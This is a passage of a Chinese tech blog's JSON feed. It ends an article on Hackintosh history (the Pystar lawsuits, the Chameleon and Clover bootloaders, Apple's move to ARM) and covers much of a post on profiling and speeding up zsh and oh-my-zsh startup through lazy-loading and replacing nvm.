Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 